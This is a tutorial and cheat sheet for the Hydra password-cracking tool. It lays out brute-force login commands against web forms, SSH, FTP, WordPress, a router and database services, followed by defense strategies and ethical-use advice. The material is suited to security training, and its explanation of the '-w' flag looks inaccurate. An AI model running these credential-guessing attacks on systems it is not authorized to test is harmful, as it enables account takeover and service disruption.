# Hydra - Comprehensive Guide

## Table of Contents
- [Overview](#overview)
- [Basic Syntax](#basic-syntax)
- [HTTP POST Form Attacks](#http-post-form-attacks)
- [Protocol-Specific Examples](#protocol-specific-examples)
- [Advanced Options](#advanced-options)
- [Real-World Scenarios](#real-world-scenarios)
- [Defense Strategies](#defense-strategies)

## Overview

Hydra is a parallelized login cracker that supports numerous protocols to attack. It's designed for security professionals to test password strength and for authorized penetration testing.

**Key Characteristics:**
- Fast and flexible
- Supports 30+ protocols
- Parallelized attacks (multiple connections simultaneously)
- Can resume interrupted sessions

## Basic Syntax

```bash
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr]
      [-u] [-f] [-t TASKS] [-M FILE] [-o FILE] [-b FORMAT] [-s PORT]
      server service [OPTIONS]
```

### Core Parameters
- `-l` or `-L`: Single username vs. username list file
- `-p` or `-P`: Single password vs. password list file
- `-C`: File with "login:password" format (colon-separated)
- `-t`: Number of parallel tasks (default: 16)
- `-f` or `-F`: Stop after first found login/password
- `-o`: Output file to save results
- `-v` or `-V`: Verbose mode (more v's = more verbose)

## HTTP POST Form Attacks

### Understanding the Command Structure
```bash
hydra -l molly -P ~/Downloads/rockyou.txt 10.201.118.17 http-post-form \
"/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." \
-t 6 -I
```

### Breaking Down the http-post-form Syntax
The format is: `"path:post_data:error_condition"`

**Components Explained:**
1. **Path:** `/login` - The URL path where the login form submits
2. **POST Data:** `username=^USER^&password=^PASS^`
   - `^USER^` and `^PASS^` are Hydra placeholders
   - These correspond to the actual HTML form field names
3. **Error Condition:** `F=Your username or password is incorrect.`
   - `F=` means "failure string" - Hydra looks for this text to identify failed attempts
   - Alternative: `S=` for "success string" (what appears on successful login)

### Finding Form Field Names
To use Hydra effectively, you need to inspect the HTML form:

```html
<!-- Example Login Form -->
<form action="/login" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

**Key elements to identify:**
- `action="/login"` → This gives you the path
- `name="username"` and `name="password"` → These become `^USER^` and `^PASS^`

## Protocol-Specific Examples

### FTP Attack
```bash
# Basic FTP brute force
hydra -L users.txt -P passwords.txt ftp://10.10.10.10

# Specific port and output file
hydra -l admin -P rockyou.txt ftp://10.10.10.10:2121 -o results.txt -t 4
```

### SSH Attack
```bash
# SSH with username list
hydra -L users.txt -P passwords.txt ssh://10.10.10.10

# Single user, specific port
hydra -l root -P passwords.txt ssh://10.10.10.10:2222 -t 4
```

### HTTP Basic Auth
```bash
# HTTP basic authentication
hydra -L users.txt -P passwords.txt http-get://10.10.10.10/private

# With specific port
hydra -l admin -P rockyou.txt http-get://10.10.10.10:8080/admin
```

### WordPress Admin Login
```bash
# WordPress wp-login.php attack
hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```

## Advanced Options

### Session Management
```bash
# Restore a previous session
hydra -R hydra.restore

# Ignore restore file (start fresh)
hydra -I -l user -P pass ftp://target
```

### Performance Tuning
```bash
# Control parallel tasks (reduce for unstable services)
hydra -l user -P passes.txt ssh://target -t 4

# Wait time between attempts (milliseconds)
hydra -l user -P passes.txt http-post-form "/login:user=^USER^&pass=^PASS^" -w 10
```

### Output Formats
```bash
# JSON output format
hydra -l admin -P passwords.txt ftp://target -b json -o results.json

# Detailed output
hydra -l admin -P passwords.txt ssh://target -vV -o detailed_results.txt
```

## Real-World Scenarios

### Scenario 1: Web Application Login
**Target:** A custom web application at `http://10.10.10.20/login.php`

**Reconnaissance Steps:**
1. Analyze the login form HTML:
```html
<form method="POST" action="auth.php">
    <input type="text" name="uname" id="uname">
    <input type="password" name="pwd" id="pwd">
    <input type="submit" value="Login">
</form>
```

2. Test manually to find error messages:
   - Success: Redirect to `/dashboard.php`
   - Failure: "Invalid credentials" message

**Hydra Command:**
```bash
hydra -L users.txt -P passwords.txt 10.10.10.20 http-post-form \
"/auth.php:uname=^USER^&pwd=^PASS^:F=Invalid credentials" -t 6 -f
```

### Scenario 2: Router Administration Panel
**Target:** Home router at `192.168.1.1` with HTTP basic auth

**Common Default Credentials Approach:**
```bash
# Try common router defaults first
hydra -C router_defaults.txt http-get://192.168.1.1/

# If that fails, full brute force
hydra -L common_users.txt -P common_passwords.txt http-get://192.168.1.1/ -t 3
```

### Scenario 3: Database Service
**Target:** MySQL service on port 3306

```bash
# MySQL brute force
hydra -L db_users.txt -P db_passwords.txt mysql://10.10.10.30:3306 -t 2

# PostgreSQL
hydra -L db_users.txt -P db_passwords.txt postgres://10.10.10.30:5432
```

## Common Error Patterns and Solutions

### Handling Different Error Messages
```bash
# Multiple failure conditions (OR logic)
hydra -l admin -P passes.txt 10.10.10.10 http-post-form \
"/login:user=^USER^&pass=^PASS^:F=Invalid login or password|F=Access denied"

# Success condition (look for specific success indicator)
hydra -l admin -P passes.txt 10.10.10.10 http-post-form \
"/login:user=^USER^&pass=^PASS^:S=Welcome|S=Dashboard" -f
```

### Dealing with CSRF Tokens
For forms with CSRF protection, you may need to:
1. First GET the login page to obtain a fresh CSRF token
2. Include the token in your POST request

```bash
# This requires a more sophisticated approach, often needing custom scripts
# Hydra alone may not suffice for modern CSRF-protected forms
```

## Defense Strategies

### How to Protect Against Hydra Attacks

**Rate Limiting:**
- Implement login attempt limits (e.g., lock after 5 failed attempts)
- Use increasing delay between attempts

**Account Lockouts:**
- Temporary lockouts after multiple failures
- Administrative alerts for brute force patterns

**Strong Authentication:**
- Enforce strong password policies
- Implement multi-factor authentication (MFA)
- Use CAPTCHA after several failed attempts

**Monitoring:**
- Log and monitor failed login attempts
- Set up alerts for unusual patterns (many rapid failures)

## Best Practices for Ethical Use

1. **Always Get Permission:** Only use Hydra on systems you own or have explicit written permission to test.

2. **Use Responsibly:** Even with permission, avoid disrupting services with excessive parallel connections.

3. **Start Conservative:** Begin with `-t 2` or `-t 4` to avoid overloading the target.

4. **Use Appropriate Wordlists:** Tailor your wordlists to the target (don't use massive lists for small targets).

5. **Document Results:** Keep detailed records for your penetration testing reports.

## Quick Reference Card

```bash
# Basic syntax template
hydra -l <username> -P <wordlist> <target> <protocol> "<module_options>"

# Common protocols
http-get, http-post-form, https-form-post, ftp, ssh, smtp, mysql, postgres

# Essential flags
-t <threads>    # Parallel tasks (default: 16)
-f             # Stop after first valid found
-o <file>      # Save results to file
-v / -V        # Verbose output
-I             # Ignore restore file
-w <time>      # Wait time between attempts
```

